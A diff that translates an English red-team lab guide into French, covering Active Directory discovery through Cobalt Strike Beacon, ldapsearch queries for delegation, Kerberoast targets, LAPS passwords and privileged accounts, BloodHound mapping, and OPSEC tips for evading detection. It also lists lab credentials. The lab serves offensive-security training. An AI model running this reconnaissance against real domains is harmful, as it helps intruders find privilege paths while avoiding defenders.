@@ -1,17 +1,17 @@
-# Discovery Lab  
+# Lab — Discovery Active Directory  
 
->The objective of this lab is to do discovery of the Active Directory domain.  Collect data and map attack paths in BloodHound in OPSEC-🟢SAFE way, instead of using collectors that will be 🚨 detected.
+>L’objectif de ce lab est d’effectuer la **Discovery** du domaine Active Directory, puis de représenter les chemins d’attaque dans **BloodHound** à partir de données collectées avec une approche **OPSEC-🟢SAFE**.
 
-## Auth Check
+## Vérifier l’authentification
 
->Establish proper Kerberos token before running ldapsearch, inject a TGT OPSEC-🟢SAFE  
+>Avant d’utiliser `ldapsearch`, disposer d’un token Kerberos valide et injecter un TGT (**OPSEC-🟢SAFE**).  
 
 ```cs
 kerberos_ticket_use C:\path\to\rsteel.kirbi
 ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem
 ```
 
-## Domain-Level LDAPSEARCH    
+## LDAPSEARCH — Reconnaissance du domaine    
 
 ```cs
 // GPO abuse — find GPOs applied to current machine/user OUs where we can write
@@ -34,7 +34,7 @@ ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=gr
 ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
 ```
 
-## Delegation LDAPSEARCH  
+## LDAPSEARCH — Delegation  
 
 ```cs
 // Unconstrained delegation — any computer/user with unconstrained delegation
@@ -50,7 +50,7 @@ ldapsearch (msDS-AllowedToDelegateTo=*) --attributes samAccountName,msDS-Allowed
 ldapsearch (msDS-AllowedToActOnBehalfOfOtherIdentity=*) --attributes samAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity
 ```
 
-## Kerberoast AS-REP Targets LDAPSEARCH
+## LDAPSEARCH — Cibles Kerberoast et AS-REP Roast
 
 ```cs
 
@@ -65,14 +65,14 @@ ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.80
 ldapsearch (&(samAccountType=805306368)(description=*)) --attributes samAccountName,description
 ```
 
-## LAPS LDAPSEARCH
+## LDAPSEARCH — LAPS
 
 ```cs
 // LAPS — if ms-Mcs-AdmPwd is readable, you get the local admin password for that host 
 ldapsearch (ms-Mcs-AdmPwd=*) --attributes name,ms-Mcs-AdmPwd
 ```
 
-## Privileged account LDAPSEARCH
+## LDAPSEARCH — Comptes privilégiés
 
 ```cs
 // AdminCount=1 user accounts — all accounts under AdminSDHolder protection
@@ -90,67 +90,67 @@ ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,
 
 ## BOFHound  
 
-1. Launch Cobalt Strike and connect to the team server.
-2. Interact with the Beacon.
-3. `ldapsearch` Enumerate the domain, users, groups, OUs, and GPOs.
-4. Copy the raw Beacon logs to the Attacker Desktop 
-5. From the Windows 🖥️ Terminal, open a tab for Ubuntu🟣🐧.
+1. Lancer Cobalt Strike et se connecter au team server.
+2. Interagir avec le Beacon.
+3. Utiliser `ldapsearch` pour énumérer le domaine, les utilisateurs, groupes, OU et GPO.
+4. Copier les logs bruts du Beacon sur l’Attacker Desktop. 
+5. Dans Windows Terminal, ouvrir un onglet Ubuntu.
 6. `cd /mnt/c/Users/Attacker/Desktop`
 7. `scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .`
-8. The password is `Passw0rd!`.
-9. 🧠 BOFHound 📂 output 📝 logs❗parsed for BloodHound❗ 
+8. Le mot de passe utilisé dans le lab est `Passw0rd!`.
+9. **BOFHound** analyse les logs et prépare les données pour BloodHound. 
 10. `bofhound -i logs`
 
 ----  
 
 ## BloodHound
 
-1. Run BloodHound.
-  1. From the Start Menu, open Docker Desktop.
-  1. Click the **Containers** link on the left-hand side.
-  1. Start all the containers by clicking the 'play' button, 🧠  wait for them to start.
-  1. From the taskbar, open Microsoft Edge.
-  1. Click the BloodHound shortcut in the favourites bar, or manually browse to `http://localhost:8080/ui/login`
-  1. The browser should autofil the credentials.  If not, use `admin` : `eA%N4frBrnn2`.
+1. Démarrer BloodHound.
+  1. Ouvrir Docker Desktop depuis le menu Démarrer.
+  1. Ouvrir la rubrique **Containers** à gauche.
+  1. Démarrer tous les containers avec le bouton Play et vérifier leur état.
+  1. Ouvrir Microsoft Edge depuis la barre des tâches.
+  1. Ouvrir le favori BloodHound ou accéder à `http://localhost:8080/ui/login`.
+  1. Si les credentials ne sont pas préremplis, utiliser `admin` et `eA%N4frBrnn2` (valeurs du lab).
 
-⚠️ You'll likely be prompted to set a new password. You can change it to anything you want.⚠️
+⚠️ Une modification du mot de passe peut être demandée lors du premier accès.⚠️
 
-1. Ingest the BOFHound 🧠 data.
-  1. After first login, click the 'start by uploading your data' link.
-  1. On the new page, click the 'Upload File(s)' button and select the JSON files produced by BOFHound 🧠.
+1. Importer les données BOFHound.
+  1. Après connexion, sélectionner le lien « start by uploading your data ».
+  1. Cliquer sur **Upload File(s)** et choisir les fichiers JSON générés par BOFHound.
 
-⚠️ They will be in *C:\\Users\\Attacker\\Desktop\\*.
+⚠️ Ils se trouvent dans `C:\Users\Attacker\Desktop\`.
 
-  1. Wait until the status reaches 'Complete'.
+  1. Attendre l’état **Complete**.
 
-1. Click the **Explore** link in the left-hand menu.
-1. Select the Cypher query search box.
-1. Using the following cypher query, search for GPOs in BloodHound:
+1. Cliquer sur **Explore** dans le menu de gauche.
+1. Sélectionner la zone de recherche Cypher.
+1. Utiliser la requête Cypher suivante pour rechercher les GPO dans BloodHound :
   1. `Match (n:GPO) return n`
-  1. Click **Run**.
+  1. Cliquer sur **Run**.
 
-1. Select the 'Workstation Admins' GPO.
-  1. Take note of its Gpcpath.
-  1. Expand its 'Affected Objects' and select 'Computers'.
+1. Sélectionner la GPO **Workstation Admins**.
+  1. Noter sa valeur `Gpcpath`.
+  1. Déplier **Affected Objects**, puis **Computers**.
 
-1. Select each computer and note their Obiect ID.
+1. Sélectionner chaque ordinateur et relever son **Object ID**.
 
-## Restricted Groups Data
+## Données Restricted Groups
 
-1. Using the gpcpath for the Workstations Admins GPO, download its **GptTmpl.inf** file using Beacon.
+1. À partir du `gpcpath` de la GPO Workstation Admins, télécharger le fichier **GptTmpl.inf** depuis le Beacon.
 
     ```Beacon-nocolor
     ls \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\
     download \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
     ```
-1. Sync the file to your Attacker Desktop.
+1. Synchroniser le fichier vers l’Attacker Desktop.
 
-⚠️ View > Downloads.
+⚠️ Dans Cobalt Strike : **View > Downloads**.
 
-1. Open the file in Notepad (or VSCode).
-  1. Note the SID of the domain group.
+1. Ouvrir le fichier avec Notepad ou VS Code.
+  1. Relever le SID du groupe de domaine.
 
-1. Add the custom edges in BloodHound.
+1. Ajouter les relations (**custom edges**) dans BloodHound.
 
     ```Cypher
     MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2101'})
@@ -163,21 +163,21 @@ ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,
     MERGE (y)-[:AdminTo]->(x)
     ```
 
-BloodHound will now show that rsteel has local administrative privileges on WKSTN-1 and 2.
+BloodHound indique alors que `rsteel` possède des privilèges administrateur locaux sur WKSTN-1 et WKSTN-2.
 
-⚠️ In this lab, you have used LDAP queries and BloodHound to map part of the CONTOSO domain.  
+⚠️ Ce lab utilise les requêtes LDAP et BloodHound pour cartographier une partie du domaine CONTOSO.  
 
 ---
 
-## OPSEC Warnings & Exam-Day Notes
+## Avertissements OPSEC et notes d’examen
 
-### ldapsearch Returns 0 Results — WinRM Token Limitation
+### ldapsearch renvoie 0 résultat — Limite du token WinRM
 
-`ldapsearch` binds to the DC using the beacon's current Kerberos token. A beacon landed via
-`jump winrm64` has a **Type 3 network logon token** — it is non-forwardable and does not carry
-Kerberos credentials for onward connections to the DC.
+`ldapsearch` se connecte au DC avec le token Kerberos courant du Beacon. Un Beacon obtenu via
+`jump winrm64` possède un **network logon token Type 3** non transmissible, qui ne fournit pas
+les credentials Kerberos nécessaires à une connexion supplémentaire vers le DC.
 
-**Symptom:**
+**Symptôme :**
 ```
 Binding to 10.10.120.1
 retrieved 0 results total
@@ -185,10 +185,10 @@ retrieved 0 results total
 
 ---
 
-### OPSEC-🔴UNSAFE Never Use⛔
+### OPSEC-🔴UNSAFE — Commandes à éviter
 
-`net computers` ⛔ `net *` OPSEC-🔴UNSAFE beacon commands run via the `shell` built-in which spawns  
-`cmd.exe` — OPSEC-🔴UNSAFE. ⛔ fails with Error 5 from a network logon token.  
-`net computers`  OPSEC-🔴UNSAFEE — spawns cmd.exe   `ldapsearch (samAccountType=805306369)`  
-`net users`   OPSEC-🔴UNSAFE — spawns cmd.exe   `ldapsearch (samAccountType=805306368)`  
-`net groups`  OPSEC-🔴UNSAFE — spawns cmd.exe  `ldapsearch (samAccountType=268435456)`  
+`net computers` et les commandes `net *` sont classées **OPSEC-🔴UNSAFE** dans ces notes : elles passent par `shell`, qui lance  
+`cmd.exe`. Depuis un network logon token, elles peuvent aussi échouer avec **Error 5**.  
+`net computers` — OPSEC-🔴UNSAFE : crée `cmd.exe`   `ldapsearch (samAccountType=805306369)`  
+`net users` — OPSEC-🔴UNSAFE : crée `cmd.exe`   `ldapsearch (samAccountType=805306368)`  
+`net groups` — OPSEC-🔴UNSAFE : crée `cmd.exe`  `ldapsearch (samAccountType=268435456)`  
